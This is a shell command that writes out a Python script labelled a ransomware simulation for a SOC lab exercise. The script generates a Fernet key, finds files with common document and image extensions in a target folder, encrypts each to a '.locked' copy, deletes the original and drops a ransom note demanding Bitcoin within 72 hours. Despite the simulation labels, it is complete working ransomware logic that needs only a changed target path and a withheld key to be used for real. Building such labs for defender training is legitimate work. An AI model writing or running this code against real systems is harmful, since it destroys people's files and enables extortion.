cat > ransomware_sim.py << 'EOF'
import os
from cryptography.fernet import Fernet

TARGET_FOLDER = "./victims_files"
KEY_FILE = "./encryption.key"
NOTE_FILE = "./victims_files/READ_ME_RANSOM.txt"
TARGET_EXTENSIONS = [".txt", ".jpg", ".png", ".pdf", ".docx"]
SKIP_FILES = ["READ_ME_RANSOM.txt"]

def generate_key():
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as f:
        f.write(key)
    print(f"[+] Key saved to {KEY_FILE}")
    return key

def scan_files(folder):
    targets = []
    for root, dirs, files in os.walk(folder):
        for file in files:
            if file in SKIP_FILES:
                continue
            if any(file.endswith(ext) for ext in TARGET_EXTENSIONS):
                targets.append(os.path.join(root, file))
    print(f"[+] Found {len(targets)} files to encrypt")
    return targets

def encrypt_file(filepath, fernet):
    with open(filepath, "rb") as f:
        data = f.read()
    encrypted = fernet.encrypt(data)
    new_path = filepath + ".locked"
    with open(new_path, "wb") as f:
        f.write(encrypted)
    os.remove(filepath)
    print(f"  [ENCRYPTED] {filepath}")

def drop_ransom_note():
    note = """
!!!  YOUR FILES HAVE BEEN ENCRYPTED  !!!
================================================
All your files have been encrypted with AES encryption.

To recover your files, pay 0.5 BTC to:
Wallet: 1A2b3C4d5E6f7G8h9I0j (FAKE - SIMULATION)

YOU HAVE 72 HOURS.

-- [SIMULATION - SOC LAB EXERCISE ONLY] --
================================================
"""
    with open(NOTE_FILE, "w") as f:
        f.write(note)
    print(f"[+] Ransom note dropped!")

def main():
    print("\n[*] Ransomware Simulation Starting...")
    print("=" * 45)
    key = generate_key()
    f = Fernet(key)
    files = scan_files(TARGET_FOLDER)
    for filepath in files:
        encrypt_file(filepath, f)
    drop_ransom_note()
    print("\n[!] Done. Use decryptor.py to recover files.\n")

if __name__ == "__main__":
    main()
EOF
